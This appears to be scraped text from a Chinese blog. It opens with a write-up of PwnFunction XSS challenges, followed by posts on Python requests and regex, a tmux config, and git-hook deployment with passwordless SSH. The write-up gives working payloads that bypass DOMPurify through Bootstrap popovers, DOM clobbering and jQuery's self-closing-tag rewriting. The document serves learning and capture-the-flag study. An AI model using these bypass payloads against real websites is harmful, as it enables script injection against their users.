第二步pwnme.innerHTML我们得到的是 1&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;&lt;!--?--&gt;&lt;svg onload=\"alert()\"&gt;&lt;/svg&gt; &lt;p&gt;&lt;/p&gt; --&amp;gt; 这时候 HTML parser 解析与我们在 Easy Version 分析差不多，只有遇到--&gt;的时候结束 Comment State 相关状态回到 data state，所以我们就成功执行了 XSS。 Keanu1234567891011121314151617181920212223242526&lt;!-- Challenge --&gt;&lt;number id=\"number\" style=\"display:none\"&gt;&lt;/number&gt;&lt;div class=\"alert alert-primary\" role=\"alert\" id=\"welcome\"&gt;&lt;/div&gt;&lt;button id=\"keanu\" class=\"btn btn-primary btn-sm\" data-toggle=\"popover\" data-content=\"DM @PwnFunction\" data-trigger=\"hover\" onclick=\"alert(`If you solved it, DM me @PwnFunction :)`)\"&gt;Solved it?&lt;/button&gt; &lt;script&gt; /* Input */ var number = (new URL(location).searchParams.get('number') || \"7\")[0], name = DOMPurify.sanitize(new URL(location).searchParams.get('name'), { SAFE_FOR_JQUERY: true }); $('number#number').html(number); $('#welcome').html(`Welcome &lt;b&gt;${name || \"Mr. Wick\"}!&lt;/b&gt;`); /* Greet */ $('#keanu').popover('show') setTimeout(_ =&gt; { $('#keanu').popover('hide') }, 2000) /* Check Magic Number */ var magicNumber = Math.floor(Math.random() * 10); var number = eval($('number#number').html()); if (magicNumber === number) { alert(\"You're Breathtaking!\") }&lt;/script&gt; 本题题目引入了四个 js 文件： 12345678910111213&lt;!-- DOMPurify(2.0.7) --&gt;&lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.7/purify.min.js\" integrity=\"sha256-iO9yO1Iy0P2hJNUeAvUQR2ielSsGJ4rOvK+EQUXxb6E=\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;!-- Jquery(3.4.1), Popper(1.16.0), Bootstrap(4.4.1) --&gt;&lt;script src=\"https://code.jquery.com/jquery-3.4.1.slim.min.js\" integrity=\"sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;script src=\"https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js\" integrity=\"sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo\" crossorigin=\"anonymous\"&gt;&lt;/script&gt;&lt;script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js\" integrity=\"sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; 这个题目也比较有意思，额外给我们增加的这几个 js 文件，也就是说这几个文件就是这道题我们可能需要用的工具了。 Purify.js 是一个 XSS WAF，Popper.js是一个用于构造提示的组件，题目中也给了一个简单的使用 popper 的例子，Jqeury.js 与 Bootstrap 就不多说了。 首先我们来看我们的可控点，一个是 name 参数，另一个是 number 参数。然而 number 参数我们却只能使用一位，而 name 参数虽然任意长度可控，但是要经过 XSS WAF 过滤。虽然之前有一些利用 mxss bypass Domprify 的事例，但是都是在 2.0 左右的版本，这里的 2.0.7 又是最新的版本，应该不会是什么新的绕过，否则 number 参数与最后的 eval($(\"number#number\").html()); 就没用了，并且还有一些其他工具我们没有用上。 所以我们应该能用到的就是通过最后一个eval($(\"number#number\").html())进行 XSS ，而 number 我们可控的只有一位，我们可能得想一些其他办法添加 number 标签当中的内容。 我们可以看到 popper document 结合题目给出的那个例子，我们可以发现貌似这个 popper.js 可以满足我们添加新内容条件，而在文档 options 部分，我们可以到有一些我们值得关注的参数： Name Type Default Description container string | element | false false Appends the popover to a specific element. Example: container: 'body'. This option is particularly useful in that it allows you to position the popover in the flow of the document near the triggering element - which will prevent the popover from floating away from the triggering element during a window resize. content string | element | function ‘’ Default content value if data-content attribute isn’t present.If a function is given, it will be called with its this reference set to the element that the popover is attached to. 我们可以从文档知道，我们可以通过data-container来控制 popover 的位置，data-content来控制内容，于是我们是不是可以有一个想法把这个 popover 弄到 number 标签当中呢？于是我们可以尝试构造如下 payload ： 1&lt;button id=\"keanu\" data-toggle=\"popover\" data-container=\"#number\" data-content=\"hello\"&gt; 利用题目中原有的$(\"#keanu\").popover(\"show\");来触发我们的 popover ，我们暂且先注释掉题目当中的延迟关闭的功能以便于我们观察。 尽管 eval 执行出错，但是我们可以发现 number 标签当中确实被我们注入了一些其他的内容 17&lt;div class=\"popover fade bs-popover-right show\" role=\"tooltip\" id=\"popover238474\" x-placement=\"right\" style=\"position: absolute;\"&gt;&lt;div class=\"arrow\"&gt;&lt;/div&gt;&lt;h3 class=\"popover-header\"&gt;&lt;/h3&gt;&lt;div class=\"popover-body\"&gt;hello&lt;/div&gt;&lt;/div&gt; 我们这样我们简化一下这个内容:7&lt;template&gt;hello&lt;/template&gt;，我们可控的地方就是 7 与 hello ，&lt;template&gt;就是 popper.js 实现的 popover 功能的代码，这个我们不需要关注，所以这样问题就变成了如何在$str=\"$1&lt;template&gt;$any&lt;/template&gt;\";eval($str);当中执行代码的问题了。 到这里其实答案已经呼之欲出了，既然是在eval当中，我们可以利用第一位为单引号，由于中间$any我们任意可控，后面再用一个单引号将&lt;template&gt;变成字符串，//注释掉后面的&lt;/template&gt;即可，整个 payload 即是'&lt;tamplate&gt;';alert();//&lt;/tamplate&gt;。 所以我们需要这么构造一个元素： 1&lt;button id=\"keanu\" data-toggle=\"popover\" data-container=\"#number\" data-content=\"';alert(1);//\"&gt; 即可实现 XSS，所以 payload: 1number='&amp;name=&lt;button id%3D\"keanu\" data-toggle%3D\"popover\" data-container%3D\"%23number\" data-content%3D\"'%3Balert(1)%3B%2F%2F\"&gt; WW312345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;!-- Challenge --&gt;&lt;div&gt; &lt;h4&gt;Meme Code&lt;/h4&gt; &lt;textarea class=\"form-control\" id=\"meme-code\" rows=\"4\"&gt;&lt;/textarea&gt; &lt;div id=\"notify\"&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt; /* Utils */ const escape = (dirty) =&gt; unescape(dirty).replace(/[&lt;&gt;'\"=]/g, ''); const memeTemplate = (img, text) =&gt; { return (`&lt;style&gt;@import url('https://fonts.googleapis.com/css?family=Oswald:700&amp;display=swap');`+ `.meme-card{margin:0 auto;width:300px}.meme-card&gt;img{width:300px}`+ `.meme-card&gt;h1{text-align:center;color:#fff;background:black;margin-top:-5px;`+ `position:relative;font-family:Oswald,sans-serif;font-weight:700}&lt;/style&gt;`+ `&lt;div class=\"meme-card\"&gt;&lt;img src=\"${img}\"&gt;&lt;h1&gt;${text}&lt;/h1&gt;&lt;/div&gt;`) } const memeGen = (that, notify) =&gt; { if (text &amp;&amp; img) { template = memeTemplate(img, text) if (notify) { html = (`&lt;div class=\"alert alert-warning\" role=\"alert\"&gt;&lt;b&gt;Meme&lt;/b&gt; created from ${DOMPurify.sanitize(text)}&lt;/div&gt;`) } setTimeout(_ =&gt; { $('#status').remove() notify ? ($('#notify').html(html)) : '' $('#meme-code').text(template) }, 1000) } }&lt;/script&gt;&lt;script&gt; /* Main */ let notify = false; let text = new URL(location).searchParams.get('text') let img = new URL(location).searchParams.get('img') if (text &amp;&amp; img) { document.write( `&lt;div class=\"alert alert-primary\" role=\"alert\" id=\"status\"&gt;`+ `&lt;img class=\"circle\" src=\"${escape(img)}\" onload=\"memeGen(this, notify)\"&gt;`+ `Creating meme... (${DOMPurify.sanitize(text)})&lt;/div&gt;` ) } else { $('#meme-code').text(memeTemplate('https://i.imgur.com/PdbDexI.jpg', 'When you get that WW3 draft letter')) }&lt;/script&gt; 这个题目让我深深地体会到了 JavaScript 的恶意…先放个图，大家自行先体会一下，然后我们开始分析一下题目。 题目用比较多的代码做了一个获取图片以及输出自定义 text 的功能，仍旧是上题的四个外部 JS 文件，以及一大段 JS 代码。本题涉及到 JavaScript 比较多的黑魔法，我们一个个来看看。 审计代码，我们可以先看到题目定义了几个函数 1const escape = dirty =&gt; unescape(dirty).replace(/[&lt;&gt;'\"=]/g, \"\"); 用来过滤我们的 img 参数 123456789const memeTemplate = (img, text) =&gt; { return ( `&lt;style&gt;@import url('https://fonts.googleapis.com/css?family=Oswald:700&amp;display=swap');` + `.meme-card{margin:0 auto;width:300px}.meme-card&gt;img{width:300px}` + `.meme-card&gt;h1{text-align:center;color:#fff;background:black;margin-top:-5px;` + `position:relative;font-family:Oswald,sans-serif;font-weight:700}&lt;/style&gt;` + `&lt;div class=\"meme-card\"&gt;&lt;img src=\"${img}\"&gt;&lt;h1&gt;${text}&lt;/h1&gt;&lt;/div&gt;` );}; 用来将我们传入的 img &amp; text 参数构造一个 HTML 模版 1234567891011121314151617const memeGen = (that, notify) =&gt; { if (text &amp;&amp; img) { template = memeTemplate(img, text); if (notify) { html = `&lt;div class=\"alert alert-warning\" role=\"alert\"&gt;&lt;b&gt;Meme&lt;/b&gt; created from ${DOMPurify.sanitize( text )}&lt;/div&gt;`; } setTimeout(_ =&gt; { $(\"#status\").remove(); notify ? $(\"#notify\").html(html) : \"\"; $(\"#meme-code\").text(template); }, 1000); }}; 用来进行 DOM 元素操作等，看起来我们的目标就是setTimeout函数中通过$(\"#notify\").html(html)来执行代码了，所以我们可能需要想办法把 notify 参数设置为 true。 DOM Clobbering首先我们先来看看几个比较有趣的例子： 根据 MDN 文档 ​ The domain property of the Document interface gets/sets the domain portion of the origin of the current document, as used by the same origin policy. 这里的document.domain并没有获取到我的域名zedd.vv，反而是获取到了 img 标签，然后我们可以直接输出 document 对象来看看是怎么回事 通过这个例子我们可以知道，可以通过一些标签的 id(name) 属性来控制 document(window) 通过 DOM API(BOM API) 获取到的某个东西 我查阅过相关资料，也询问过一些前端的专业人员，这里给我的解释是”document 和 window 两个变量，其实是 DOM 和 BOM 的规范，一般来说这两个不应该被当做普通的 JS 对象，但是规范与实现不同”，”都是因为上古遗留问题，现在哪有直接写 document.xxx 来获取元素的，TS 和 eslint 都会报错”。 这种操作具体可以参考 dom-clobbering，不算是新的攻击手法，但是有效，我们可以通过利用这种 Trick 来实现一些操作。 setTimeout我们了解了 Dom Clobbering 之后，我们可以先看看可以怎么通过setTimeout来利用 12345&lt;div id=\"a\"&gt;&lt;/div&gt;&lt;script&gt; a.innerHTML = new URL(location).searchParams.get('b'); setTimeout(ok, 2000)&lt;/script&gt; 简化了一下题目代码，对于以上的代码，我们可以通过利用 Dom Clobbering 来实现 XSS ，因为我们可以直接传入 id 为 ok 的标签进行 XSS ，例如传入 1&lt;a id=ok href=javascript:alert()&gt; 可是为什么呢？ 根据 MDN 文档，setTimeout的第一个参数，必须是个函数或字符串。可是根据 Dom Clobbering ，这里的ok应该是一个 a 标签，既然这不是个函数，它就尝试用toString方法转换成字符串，而根据 MDN 文档 HTMLAnchorElement ​ HTMLHyperlinkElementUtils.toString() Returns a USVString containing the whole URL. It is a synonym for HTMLHyperlinkElementUtils.href, though it can’t be used to modify the value. 而当 a 标签通过toString()方法转换我们可以得到它的 href 属性，也就是javascript:alert()，所以我们就可以执行代码了。 notify好了，回到我们的 notify 上，虽然我们可以通过 DOM Clobbering 进行“污染”一些参数，但是题目直接规定了let notify = false，浏览器当然也不可能允许我们修改服务端的代码，这可怎么办？ 其实这里的 notify 比较具有误导性，比较像 C 语言入门的时候函数传参部分，我们把整个代码改一下： 123456789101112131415161718192021222324252627282930313233&lt;script&gt; const memeGen = (that, notify) =&gt; {truetruetruetrueif (text &amp;&amp; img) {truetruetruetruetruetemplate = memeTemplate(img, text);truetruetruetruetrueif (notify) { //...truetruetruetruetrue}truetruetruetrue}truetruetrue};&lt;/script&gt;&lt;script&gt; /* Main */ let notify = false; let text = new URL(location).searchParams.get(\"text\"); let img = new URL(location).searchParams.get(\"img\"); if (text &amp;&amp; img) { document.write( `&lt;div class=\"alert alert-primary\" role=\"alert\" id=\"status\"&gt;` + `&lt;img class=\"circle\" src=\"${escape( img )}\" onload=\"memeGen(this, notify)\"&gt;` + `Creating meme... (${DOMPurify.sanitize(text)})&lt;/div&gt;` ); } else { $(\"#meme-code\").text( memeTemplate( \"https://i.imgur.com/PdbDexI.jpg\", \"When you get that WW3 draft letter\" ) ); }&lt;/script&gt; 再简化一下就成了我们的 C 语言函数传参的练习题了 12345const memeGen = (that, x) =&gt; { if (x) { //... }}; 为了易于理解我们可以写成这样就不易弄混了，所以，对于memeGen来说，notify只是一个参数变量名，区别于我们一开始提到的 Javascript Scope 部分，该函数内的notify参数变量取决于该函数所在的作用域。 而对于memeGen函数来说，它的作用域并非是在let notify = false所处的 JS 代码域当中，而是在通过document.write函数之后的作用域，所以这里就涉及到了作用域的问题。 JavaScript Scope所以对于执行document.write函数过后，也就是对于onload=memeGen函数来说，其作用域并非是 JS 的作用域，在题目中本来这么几个作用域：window、script、onload，其中 window 包含了后两个，后两个互不包含，所以这里在 onload 找不到 notify 变量，就会去 window 的作用域找，就会把 script 作用域当中的 notify 给找到，notify 变量也就成 false 了。 我们也可以通过一个简单的例子来理解： 1234567891011121314&lt;div name=x&gt;&lt;/div&gt;&lt;script&gt; const test = (that,x) =&gt; { console.log(\"Test'x: \" + x); if(x){ console.log(\"JS Magic\"); } };&lt;/script&gt;&lt;script&gt; let x = false; console.log(\"JS'x: \" + x); document.write(\"&lt;img src=x onerror=test(this,x)&gt;\");&lt;/script&gt; 原理都是一样的，这里test函数在onerror作用域找到了 x 变量，所以就不会再去找 window 作用域下的 x=false变量了，所以本题我们需要引入一个name=notify的标签来“覆盖”掉原来的 notify 变量。 其实这也是一开始我们可以发现题目给出的代码有一处也比较神奇就是 text &amp; img 123456const memeGen = (that, notify) =&gt; { if (text &amp;&amp; img) { template = memeTemplate(img, text); ... }}; memeGen函数在函数内找不到text，onload 的作用域也找不到text，就会去 script下面找，而多个 script 属于同一个作用域，所以对于函数当中的 text 以及 img ，它是在下一块 JS 代码段定义的。 123456&lt;script&gt;let notify = false;let text = new URL(location).searchParams.get(\"text\");let img = new URL(location).searchParams.get(\"img\"); ...&lt;/script&gt; JQuery’s ‘mXSS’所以基本上 notify 的问题我们解决了，接下来就是 DOM Purify 的问题了。 我们可以知道最终我们要插入的代码是通过$(\"#notify\").html(html)来插入的，而参数 html 又来自 1html = `&lt;div class=\"alert alert-warning\" role=\"alert\"&gt;&lt;b&gt;Meme&lt;/b&gt; created from ${DOMPurify.sanitize(text)}&lt;/div&gt;`; 简单跟一下 JQuery 的 html() 函数，我们可以发现有以下利用链： html()-&gt;append()-&gt;doManip()-&gt;buildFragment()-&gt;htmlPrefilter() 在 htmlPrefilter() 函数中我们可以看到有这么一段代码： 123456// source of htmlPrefilter()jQuery.extend( {truehtmlPrefilter: function( html ) {truetruereturn html.replace( rxhtmlTag, \"&lt;$1&gt;&lt;/$2&gt;\" );true}, ... 这段代码就是用来转换一些自闭合标签的标签，例如&lt;blah/&gt;变成&lt;blah&gt;&lt;/blah&gt;，我们就可以利用这个特性来实现一些绕过，例如： 1&lt;style&gt;&lt;style/&gt;Elon 经过innerHTML会变成 123&lt;style&gt; &lt;style/&gt;Elon&lt;/style&gt; 但是经过 jquery html() 就会变成 1234&lt;style&gt; &lt;style&gt;&lt;/style&gt;Elon 我们可以发现通过html()可以把一些自闭合的拆分，以及把内容转换出去，有点类似于 mXSS ，最终我们得到的是 1&lt;style&gt;&lt;style&gt;&lt;/style&gt;Elon&lt;/style&gt; 所以我们可以利用这个特性绕过 XSS WAF，例如以下 1&lt;style&gt;&lt;style/&gt;&lt;script&gt;alert()// 经过DOMPurify.sanitize我们可以得到 1&lt;style&gt;&lt;style/&gt;&lt;script&gt;alert(1337)//&lt;/style&gt; 经过 jquery html()到最终渲染页面就变成了 1&lt;style&gt;&lt;style&gt;&lt;/style&gt;&lt;script&gt;alert(1337)//&lt;/style&gt;&lt;/div&gt;&lt;/script&gt;&lt;/div&gt;&lt;/div&gt; 所以这就是 JQuery’s 类似于 mXSS 的 trick 综上所述，配合我们之前的内容，最终 payload 如下： 1&lt;img name=notify&gt;&lt;style&gt;&lt;style/&gt;&lt;script&gt;alert()// 最终传参: 1img=valid_img_url&amp;text=&lt;img name%3dnotify&gt;&lt;style&gt;&lt;style%2F&gt;&lt;script&gt;alert()%2F%2F 这里我也不是非常清楚作者为啥要加一个 img 参数//全程没有用到 最后再来一遍： ReferencesDOM Clobbering HTMLAnchorElement","link":"/2020/02/11/xssgame/"},{"title":"几道题中的学习","text":"前些天一直在刷题，不过都是一些挺简单的，然后有几道需要python脚本的题可谓是把我弄了一波，认认真真地去学习了一波python以及正则。就聊一下这几道题收获吧。 PythonRequests首先是python requests库的学习 对于request的回显如果显示乱码的话，可以添加 1rep.encoding = 'utf-8' 进阶用法可以用 1r = requests.session() 用来保持会话，以及可以直接实现带cookie二次访问 1234#比如第一次建立链接rep = r.get('xxx.com')#第二次需要post数据，以及以上次的cookie访问rep2 = r.post('xxx.com',data=data) 这就很方便了，不需要再单独记录cookie来确定是同一次session了 还有python的正则库re 12345import repattern = re.compile(r'^[^=]*')match = pattern.match(yourString)if match: print match.group(0) 在re.compile引号中输入你的正则表达式，然后进行匹配 exec、eval、representsexec语句用来执行储存在字符串或文件中的Python语句。例如，我们可以在运行时生成一个包含Python代码的字符串，然后使用exec语句执行这些语句。 1exec(\"print('Hello World')\") 运行结果： Hello World eval语句用来计算存储在字符串中的有效Python表达式。 1eval_r(\"2 * 3\") 运行结果： 6 repr函数用来取得对象的规范字符串表示。注意，在大多数时候有eval_r(repr(object)) == object。 可以参考Python中repr与str区别 执行shell命令 os.system os模块中的os.system()这个函数来执行shell命令 os.system('ls') 输出结果： Appalication Desktop Downloads print os.system('mkdir test') 输出结果: 0 可以看到结果打印出0，表示命令执行成功；否则表示失败（再次执行该命令，输出：子目录或文件 test 已经存在。1） 再次执行: mkdir: test: File exists 256 注，这个方法得不到shell命令的输出。 popen() 这个方法能得到命令执行后的结果是一个字符串，要自行处理才能得到想要的信息。 12345import osstr = os.popen(\"ls\").read()a = str.split(\"\\n\")for b in a: print b 输出结果与os.system('ls')一致 commands模块 可以很方便的取得命令的输出（包括标准和错误输出）和执行状态位 123456789101112import commandsa,b = commands.getstatusoutput('ls')a是退出状态b是输出的结果。&gt;&gt;&gt; import commands&gt;&gt;&gt; a,b = commands.getstatusoutput('ls')&gt;&gt;&gt; print a0&gt;&gt;&gt; print bApplicationDesktopDownloads commands.getstatusoutput(cmd)返回（status,output) commands.getoutput(cmd)只返回输出结果 commands.getstatus(file)返回ls -ld file 的执行结果字符串，调用了getoutput，不建议使用这个方法。 subprocess模块 使用subprocess模块可以创建新的进程，可以与新建进程的输入/输出/错误管道连通，并可以获得新建进程执行的返回状态。使用subprocess模块的目的是替代os.system()、os.popen()、commands.等旧的函数或模块。 1234567import subprocesssubprocess.call(command, shell=True)#会直接打印出结果。subprocess.Popen(command, shell=True)#也可以是subprocess.Popen(command, stdout=subprocess.PIPE, shell=True) 这样就可以输出结果了。#如果command不是一个可执行文件，shell=True是不可省略的。#shell=True意思是shell下执行command 正则表达式正则表达式自己还是有点弱，主要是一些原理自己有点懒得去了解，就导致每次写正则自己都很蠢… 转载改编自:正则表达式 - 贪婪与非贪婪（惰性）（侵删） 使用场景有时，我们想用正则匹配以某个子串开头，且以某个子串或字符结尾的子字符串，但是结尾的字串或字符在原字符串中出现了多次，但我们只想匹配从开始处到第一次出现的地方，换句话说，想得到开始和结尾之间内容最少的匹配。 正则的贪婪与非贪婪（惰性）通常使用如下字符类描述前导字符的重复特征： ?: 告诉引擎匹配前导字符0次或一次。事实上是表示前导字符是可选的。 +: 告诉引擎匹配前导字符1次或多次。 *: 告诉引擎匹配前导字符0次或多次。 {min, max}: 告诉引擎匹配前导字符min次到max次。min和max都是非负整数。如果有逗号而max被省略了，则表示max没有限制；如果逗号和max都被省略了，则表示重复min次。因此 {0,} 和 * 一样，{1,} 和 + 的作用一样。 贪婪与非贪婪贪婪 : 默认情况下，? + * {min, max}都是贪婪的，也就是说，它会根据前导字符去匹配尽可能多的内容。 非贪婪(惰性) : 非贪婪就是匹配尽可能少的内容。 原理浅析结合实例来分析哈基于正则的引擎对文本的匹配过程。原始字符串：This is a &lt;EM&gt;first&lt;/EM&gt; test，使用正则&lt;.+&gt;来匹配HTML标签，期望第一次匹配得到&lt;EM&gt;，第二次匹配得到&lt;/EM&gt;，实际却是第一次匹配就得到了&lt;EM&gt;first&lt;/EM&gt;。 来看看匹配过程，第一个记号是&lt;，这是一个文本字符，匹配其自身。第二个符号是.，匹配了字符E，然后+一直可以匹配其余的字符，直到一行的结束。然后到了换行符，匹配失败（.不匹配换行符）。于是引擎开始对下一个正则表达式符号进行匹配，即试图匹配&gt;。到目前为止，&lt;.+已经匹配了&lt;EM&gt;first&lt;/EM&gt; test。引擎会试图将&gt;与换行符进行匹配，结果失败了。于是引擎进行回溯。回溯后的匹配状况是 &lt;.+ 匹配 &lt;EM&gt;first&lt;/EM&gt; tes。于是引擎将&gt;与t进行匹配。显然还是会失败。这个过程继续，直到 &lt;.+ 匹配 &lt;EM&gt;first&lt;/EM，&gt;与&gt;匹配。于是引擎找到了一个匹配&lt;EM&gt;first&lt;/EM&gt;。记住，正则导向的引擎是急切的，所以它会急着报告它找到的第一个匹配。而不是继续回溯，即使可能会有更好的匹配，例如&lt;EM&gt;。所以我们可以看到，由于+的贪婪性，使得正则表达式引擎返回了一个最左边的最长的匹配。 如果想得到期望的结果，就需要启用非贪婪模式：&lt;.+?&gt; 总结：如果是贪婪匹配模式，正则引擎会一直匹配到字符串最后；当匹配为false时，就回溯以找到倒数第一个匹配位置，返回匹配结果。 如果是非贪婪匹配模式，正则引擎会匹配到符合pattern的末尾位置那个字符，然后再往后走一步，发现匹配为false时，就回溯以找到最近一个匹配为true的位置，返回匹配结果。 实例例如，原始字符串： 1{\"accesskey\":{\"acccessKeyId\":\"XhUURxsMlJE6EiXf\",\"accessKeySecret\":\"Q9fMpgBgRnKycMRD28MMkkFMbiNkbY\"},\"dbGrant\":{\"0000031736\":\"READWRITE\"},\"dbSchemaId\":\"0000031737\"} 现在想把这部分敏感信息替换为空字符串： 1\"accesskey\":{\"acccessKeyId\":\"XhUURxsMlJE6EiXf\",\"accessKeySecret\":\"Q9fMpgBgRnKycMRD28MMkkFMbiNkbY\"}, 先不考虑结尾的逗号，尝试正则：\"accesskey\":\\{.+\\}，直接匹配至原始字符串结尾的}字符，因为引擎默认会匹配尽可能多的内容。 考虑到贪婪性，将正则修改为：\"accesskey\":\\{.+\\}+?，匹配结果一样。纳尼？难道我对贪婪性的理解有问题。梳理哈使用姿势，我期望它匹配到开始位置之后出现的第一个}字符，对应的表达式部分为}+?。套用非贪婪模式分析问题，期望对一个或多个}字符进行匹配，且匹配尽可能少的内容，但在原始串中，}字符都是分开的，没有连续，无论如何只能匹配一个单独的}字符。可见对}字符开启非贪婪模式匹配行不通。 想要匹配到开始位置之后出现的第一个}字符 也可以表达为 开始位置和末尾}字符之间的内容最少，对应正则部分修改为：.+?，完整表达式：\"accesskey\":\\{.+?\\}，测试匹配结果，妥妥的。 以上均为转载，这里讲讲自己的实例 1sid=14d8f776-a969-4252-b35a-f83a807e7f2d;userName=111111111; 目的是匹配 1sid=14d8f776-a969-4252-b35a-f83a807e7f2d; 一开始自己瞎糊弄了半天，最后找到了比较接近的sid=.*;，可是这个直接匹配到了行末，把userName一起包含进去了，这时候就要考虑到非贪婪性了，即sid=.*?;就可以匹配到第一个遇到的; 又如 11087080534*1062477688-245892309-863670697+1430950488-2128604487+787613783-929770459-331572804*1754549713+81041939=?; 匹配前面的算数表达式（=前面的表达式不包括=） 自己也瞎糊弄了好久，一开始写的是.*=死活都包含了=，这就很烦了 然后认真去看了正则，用了[^]，解释是 Match any character that is not in the set. 就是匹配任何不包含这个字符的字符串 所以最后是^[^=]* 还有对于 1跑的还不错，给你flag吧: NzI3NTY3 匹配最后的base64字符串，之前考虑的是(?=:).* 但是还是老问题老是匹配了:…?&lt;在python中不能用…这就比较麻烦了 然后查了一下发现可以用group来弄，差不多就是给他们分组的意思 1(.*)(: )(.*) 这就分成了三组，第一组匹配的是中文，第二组匹配的是:，第三组匹配的就是最后的字符串，所以我们只需要提取group(3)就好了。 Tmux配置记录详情参考tmux配置 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#-- base --#set -g default-terminal \"screen-256color\"set -g display-time 3000set -g history-limit 10000set -g base-index 1set -g pane-base-index 1set -s escape-time 0set -g mouse on#-- bindkeys --## split windows like vim. - Note: vim's definition of a horizontal/vertical split is reversed from tmux'sunbind sbind s split-window -vbind S split-window -v -l 40bind v split-window -hbind V split-window -h -l 120# navigate panes with hjklbind h select-pane -Lbind j select-pane -Dbind k select-pane -Ubind l select-pane -R# key bindings for horizontal and vertical panesunbind %bind | split-window -h # 使用|竖屏，方便分屏unbind '\"'bind - split-window -v # 使用-横屏，方便分屏# swap panesbind ^u swapp -Ubind ^d swapp -Dbind q killpbind ^e lastunbind rbind r source-file ~/.tmux.conf \\; display \"Configuration Reloaded!\"#-- statusbar --#set -g status-justify centreset -g status-left \"#[fg=red]s#S:w#I.p#P#[default]\"set -g status-right '[#(whoami)#(date +\" %m-%d %H:%M \")]'set -g status-left-attr brightset -g status-left-length 120set -g status-right-length 120set -g status-utf8 onset -g status-interval 1set -g visual-activity onsetw -g monitor-activity onsetw -g automatic-rename off# default statusbar colorsset -g status-bg colour235 #base02set -g status-fg colour136 #yellowset -g status-attr default# default window title colorssetw -g window-status-fg colour244setw -g window-status-bg default#setw -g window-status-attr dim# active window title colorssetw -g window-status-current-fg colour166 #orangesetw -g window-status-current-bg default#setw -g window-status-current-attr bright# window title string (uses statusbar variables)set -g set-titles-string '#T'set -g status-justify \"centre\"set -g window-status-format '#I #W'set -g window-status-current-format ' #I #W '# pane borderset -g pane-active-border-fg '#55ff55'set -g pane-border-fg '#555555'# message textset -g message-bg colour235 #base02set -g message-fg colour166 #orange# pane number displayset -g display-panes-active-colour colour33 #blueset -g display-panes-colour colour166 #orange# clocksetw -g clock-mode-colour colour64 #green# 修改进入命令模式按键# remap prefix to Control + a# set -g prefix C-a# unbind C-b# bind C-a send-prefix","link":"/2018/04/13/%E5%87%A0%E9%81%93%E9%A2%98%E4%B8%AD%E7%9A%84%E5%AD%A6%E4%B9%A0/"},{"title":"博客自动化及一些坑","text":"迁了一下服务器，顺便弄了一下Git hook，把两个仓库给实现本地修改触发git hook实现服务器自动部署。 什么是git hooks\b\b在git上是这么介绍的： 和其它版本控制系统一样，Git能在特定的重要动作发生时触发自定义脚本。有两组这样的钩子：客户端的和服务器端的。客户端钩子由诸如提交和合并这样的操作所调用，而服务器端钩子作用于诸如接收被推送的提交这样的联网操作。 你可以随心所欲地运用这些钩子。 个人理解的git hook其实就像一个触发器吧，当远程服务器收到本地的命令之后就执行某些操作。 git hooks的种类git中，有两种类型的钩子：客户端的和服务器端的。 客户端的钩子有： pre-commit 钩子在键入提交信息前运行。 prepare-commit-msg 钩子在启动提交信息编辑器之前，默认信息被创建之后运行。 post-commit 钩子在整个提交过程完成后运行。 applypatch-msg 你可以用该脚本来确保提交信息符合格式，或直接用脚本修正格式错误。 pre-applypatch 在 git am 运行期间被调用 post-applypatch 运行于提交产生之后，是在 git am 运行期间最后被调用的钩子。 pre-rebase 钩子运行于变基之前，以非零值退出可以中止变基的过程。 post-rewrite 钩子被那些会替换提交记录的命令调用。 post-checkout 在 git checkout 成功运行后调用。 post-merge 在 git merge 成功运行后调用。 pre-push 在 git push 运行期间， 更新了远程引用但尚未传送对象时被调用。 pre-auto-gc 会在垃圾回收开始之前被调用，可以用它来提醒你现在要回收垃圾了，或者依情形判断是否要中断回收。 服务器端的钩子有： pre-receive 处理来自客户端的推送操作时最先被调用。 update 它会为每一个准备更新的分支各运行一次。 post-receive 在整个过程完结以后运行，可以用来更新其他系统服务或者通知用户。 如何使用git hooks所有的钩子脚本都存放在 .git/hooks 文件夹中。当使用 git init 初始化一个新版本库时，Git 默认会在这个目录中放置一些示例脚本。这些示例的名字都是以 .sample 结尾，如果你想启用它们，得先移除这个后缀。 简单的自动部署既然要在服务器上进行操作，肯定得登录服务器了咯。 服务器登录要实现ssh免密码登录，大家也可以具体参考一下这篇文章 A为本地主机(即用于控制其他主机的机器) ;B为远程主机(即被控制的机器Server), 假如ip为172.24.253.2 ;A和B的系统都是Linux 在A上的命令: $ ssh-keygen -t rsa (连续三次回车,即在本地生成了公钥和私钥,不设置密码) $ ssh root@172.24.253.2 “mkdir .ssh;chmod 0700 .ssh” (需要输入密码， 注:必须将.ssh的权限设为700) $ scp ~/.ssh/id_rsa.pub root@172.24.253.2:.ssh/id_rsa.pub (需要输入密码) 在B上的命令:$ touch /root/.ssh/authorized_keys (如果已经存在这个文件, 跳过这条) $ chmod 600 /.ssh/authorized_keys (# 注意： 必须将/.ssh/authorized_keys的权限改为600, 该文件用于保存ssh客户端生成的公钥，可以修改服务器的ssh服务端配置文件/etc/ssh/sshd_config来指定其他文件名） $ cat /root/.ssh/id_rsa.pub &gt;&gt; /root/.ssh/authorized_keys (将id_rsa.pub的内容追加到 authorized_keys 中, 注意不要用 &gt; ，否则会清空原有的内容，使其他人无法使用原有的密钥登录) 回到A机器: $ ssh root@172.24.253.2 (不需要密码, 登录成功) \b\b这样就轻松实现了ssh免密登录 初始化git init 和 git init –bare 的区别初始化出来的仓库是不一样的，前者初始化的是一个普通的仓库，其中 .git 文件夹是隐藏的，并且能看见该仓库下所有的源码。而后者初始化出来的仓库中的文件，就是 .git 